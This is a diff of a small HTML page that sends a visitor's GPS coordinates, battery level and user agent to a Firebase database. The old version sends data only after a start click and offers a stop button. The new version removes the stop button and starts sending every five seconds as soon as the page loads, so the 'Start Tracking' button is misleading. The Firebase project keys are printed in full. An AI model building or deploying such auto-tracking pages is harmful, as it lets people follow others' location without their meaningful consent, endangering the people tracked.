@@ -1,212 +1,67 @@
 <!DOCTYPE html>
-<html lang="bn">
+<html lang="en">
 <head>
-<meta charset="utf-8" />
-<meta name="viewport" content="width=device-width,initial-scale=1" />
-<title>Share Live Location — Send</title>
+<meta charset="UTF-8">
+<title>User Live Location</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+
 <style>
-  body{font-family:Arial; background:#f1f8ff; color:#111; text-align:center; padding:18px;}
-  .card{background:#fff; padding:18px; border-radius:10px; box-shadow:0 4px 12px rgba(0,0,0,.06); max-width:720px; margin:16px auto;}
-  button{background:#0a84ff; color:#fff; border:none; padding:12px 18px; border-radius:8px; font-size:16px; cursor:pointer;}
-  #status{margin-top:12px; font-size:14px;}
-  .small{font-size:13px; color:#555}
+body{font-family:Arial;background:#eef6ff;text-align:center;padding:20px}
+.card{background:white;padding:15px;border-radius:12px;max-width:350px;margin:auto}
+button{padding:12px 18px;background:#007bff;color:#fff;border:none;border-radius:8px;font-size:16px;margin-top:10px}
 </style>
 
-<!-- Firebase v8 (Realtime DB) -->
 <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
 <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
-</head>
-<body>
-  <h2>📍 Live Location Sender</h2>
-  <div class="card">
-    <p>আপনি চাইলে এই পেজ খুলে **Live location** ও ডিভাইস ইনফো শেয়ার করতে পারবেন।</p>
-
-    <button id="startBtn">🔴 Start live sharing</button>
-    <button id="stopBtn" style="display:none; margin-left:8px; background:#ff3b30">⛔ Stop</button>
-
-    <div id="status" class="small">Status: waiting...</div>
-    <div style="margin-top:12px; text-align:left; font-size:13px; color:#333">
-      <b>Last sent:</b>
-      <div id="lastData" class="small">—</div>
-    </div>
-  </div>
 
 <script>
-/* ---------------- Firebase config (replace if needed) ---------------- */
 const firebaseConfig = {
-  apiKey: "AIzaSyCsGBSRCHVUhXQZ5DNMEZWgQWk1gxMF1E4",
-  authDomain: "signup-d32c5.firebaseapp.com",
-  projectId: "signup-d32c5",
-  storageBucket: "signup-d32c5.firebasestorage.app",
-  messagingSenderId: "583812949955",
-  appId: "1:583812949955:web:fab1bb7be94bc1b4ab3f76",
-  databaseURL: "https://signup-d32c5-default-rtdb.firebaseio.com/"
+ apiKey:"AIzaSyCsGBSRCHVUhXQZ5DNMEZWgQWk1gxMF1E4",
+ authDomain:"signup-d32c5.firebaseapp.com",
+ projectId:"signup-d32c5",
+ storageBucket:"signup-d32c5.firebasestorage.app",
+ messagingSenderId:"583812949955",
+ appId:"1:583812949955:web:fab1bb7be94bc1b4ab3f76",
+ databaseURL:"https://signup-d32c5-default-rtdb.firebaseio.com/"
 };
 firebase.initializeApp(firebaseConfig);
-const db = firebase.database();
 
-/* ---------------- Client ID (persistent) ---------------- */
-let clientId = localStorage.getItem('clientId_v1');
-if(!clientId){
-  clientId = 'usr_' + Math.random().toString(36).substring(2,10);
-  localStorage.setItem('clientId_v1', clientId);
-}
+let uid = "usr_" + Math.random().toString(36).substr(2,6);
 
-/* ---------------- Helpers ---------------- */
-function parseDeviceModel(ua){
-  // Best-effort parsing for common android vendor words
-  ua = ua || '';
-  const vendors = ['SM-','Pixel','Redmi','RMX','Vivo','OPPO','Realme','HUAWEI','HONOR','Mi','Moto','Infinix','itel','Nokia','OnePlus'];
-  for(const v of vendors){
-    if(ua.includes(v)) {
-      // return surrounding token
-      const match = ua.match(new RegExp(`(${v}[\\w\\-0-9]+)`, 'i'));
-      if(match) return match[1];
-    }
-  }
-  // fallback: return platform chunk
-  const parts = ua.split(';').map(s=>s.trim());
-  return parts.length>1 ? parts[1] : ua;
-}
-
-async function reverseGeocode(lat, lon){
+async function getBattery(){
   try {
-    // Nominatim free reverse geocode (rate-limited, use modest calls)
-    const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=10&addressdetails=1`;
-    const res = await fetch(url, {headers: {'User-Agent':'live-tracker-example'}} );
-    if(!res.ok) return {};
-    const j = await res.json();
-    return {
-      city: j.address?.city || j.address?.town || j.address?.village || j.address?.county || null,
-      country: j.address?.country || null,
-      display_name: j.display_name || null
-    };
-  } catch(e){
-    return {};
-  }
+    const b = await navigator.getBattery();
+    return Math.round(b.level*100);
+  } catch { return 0; }
 }
 
-/* ---------------- Live sending logic ---------------- */
-let watchId = null;
-let batteryObj = null;
-let sending = false;
+async function send(){
+  let bat = await getBattery();
+  navigator.geolocation.getCurrentPosition(pos=>{
+    let lat=pos.coords.latitude, lon=pos.coords.longitude;
 
-const startBtn = document.getElementById('startBtn');
-const stopBtn = document.getElementById('stopBtn');
-const statusDiv = document.getElementById('status');
-const lastDataDiv = document.getElementById('lastData');
-
-async function prepareBattery(){
-  if(!navigator.getBattery) return null;
-  try {
-    batteryObj = await navigator.getBattery();
-    return batteryObj;
-  } catch(e){ return null; }
-}
-
-async function sendDataOnce(position){
-  const lat = position.coords.latitude;
-  const lon = position.coords.longitude;
-  const speed = position.coords.speed || null;
-  const accuracy = position.coords.accuracy || null;
-  const ua = navigator.userAgent || '';
-  const platform = navigator.platform || '';
-  const model = parseDeviceModel(ua);
-
-  // battery
-  let batteryLevel = null, charging = null;
-  if(batteryObj){
-    batteryLevel = Math.round(batteryObj.level * 100) + '%';
-    charging = batteryObj.charging;
-  }
-
-  // reverse geocode (city/country)
-  const geo = await reverseGeocode(lat, lon);
-
-  const payload = {
-    clientId,
-    latitude: lat,
-    longitude: lon,
-    accuracy,
-    speed,
-    battery: batteryLevel,
-    charging,
-    userAgent: ua,
-    platform,
-    model,
-    city: geo.city || null,
-    country: geo.country || null,
-    place: geo.display_name || null,
-    time: new Date().toISOString()
-  };
-
-  // Save into "locations/<clientId>" so latest always available per client
-  try {
-    await db.ref('locations/' + clientId).set(payload);
-    statusDiv.innerHTML = '✅ Sharing active (id: <b>' + clientId + '</b>)';
-    lastDataDiv.innerHTML = JSON.stringify({
-      lat: payload.latitude,
-      lon: payload.longitude,
-      battery: payload.battery,
-      model: payload.model,
-      city: payload.city
-    }, null, 2);
-  } catch(e){
-    statusDiv.innerHTML = '⚠️ Firebase write failed';
-    console.error(e);
-  }
-}
-
-/* watchPosition callback */
-async function posHandler(pos){
-  // send minimal frequently - we also update battery events separately
-  await sendDataOnce(pos);
-}
-
-/* start/stop controls */
-startBtn.addEventListener('click', async ()=>{
-  if(sending) return;
-  // prepare battery object
-  await prepareBattery();
-  // start watch
-  if(!navigator.geolocation){
-    alert('Your device does not support GPS.');
-    return;
-  }
-  watchId = navigator.geolocation.watchPosition(posHandler, err=>{
-    alert('Location access required. Please enable and refresh.');
-    console.error(err);
-  }, {enableHighAccuracy:true, maximumAge:2000, timeout:10000});
-
-  // also update battery on change
-  if(batteryObj){
-    batteryObj.addEventListener('levelchange', ()=> {
-      statusDiv.innerHTML = '✅ Battery: ' + Math.round(batteryObj.level*100) + '%';
-      // update firebase small battery update
-      db.ref('locations/' + clientId + '/battery').set(Math.round(batteryObj.level*100) + '%');
-      db.ref('locations/' + clientId + '/charging').set(batteryObj.charging);
-      db.ref('locations/' + clientId + '/time').set(new Date().toISOString());
+    firebase.database().ref("users/"+uid).set({
+      lat, lon,
+      battery:bat,
+      device:navigator.userAgent,
+      time:new Date().toLocaleString(),
+      location:""
     });
-    batteryObj.addEventListener('chargingchange', ()=>{
-      db.ref('locations/' + clientId + '/charging').set(batteryObj.charging);
-      db.ref('locations/' + clientId + '/time').set(new Date().toISOString());
-    });
-  }
-
-  sending = true;
-  startBtn.style.display='none';
-  stopBtn.style.display='inline-block';
-});
-
-stopBtn.addEventListener('click', ()=>{
-  if(watchId) navigator.geolocation.clearWatch(watchId);
-  watchId = null;
-  sending = false;
-  startBtn.style.display='inline-block';
-  stopBtn.style.display='none';
-  statusDiv.innerHTML = '🔴 Stopped';
-});
-
+    document.getElementById("st").innerText = "✅ Live location sending...";
+  },()=>{
+    alert("Location permission on kore chan!");
+  });
+}
+setInterval(send,5000);
 </script>
+</head>
+<body>
+
+<div class="card">
+<h2>📍 Live Location ON</h2>
+<p id="st">Press start below</p>
+<button onclick="send()">Start Tracking</button>
+</div>
+
 </body>
 </html>
